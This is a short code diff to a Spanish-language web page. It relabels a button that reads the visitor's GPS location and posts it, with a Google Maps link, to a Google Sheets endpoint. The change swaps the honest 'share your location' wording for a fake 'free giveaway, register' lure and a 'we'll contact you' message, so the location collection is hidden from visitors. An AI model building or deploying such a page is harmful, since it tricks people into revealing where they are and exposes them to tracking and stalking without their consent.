@@ -14,9 +14,9 @@
 <body>
 
 <div class="box">
-    <h2>📍 Prueba de Ubicación</h2>
-    <p>Haz clic en el botón para compartir tu ubicación.</p>
-    <button onclick="obtenerYEnviarUbicacion()">Compartir Ubicación</button>
+    <h2>🎁 Sorteo Gratis🎁</h2>
+    <p>Haz clic en el botón para participar👇.</p>
+    <button onclick="obtenerYEnviarUbicacion()">Registrate</button>
     <div id="resultado"></div>
 </div>
 
@@ -41,7 +41,7 @@ function obtenerYEnviarUbicacion() {
             const precision = Math.round(posicion.coords.accuracy);
             const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            resultado.innerHTML = "✅ Ubicación registrada correctamente.";
+            resultado.innerHTML = "✅ Gracias, te estaremos contactando 😀.";
 
             // Enviar datos a Google Sheets mediante POST
             fetch(WEB_APP_URL, {
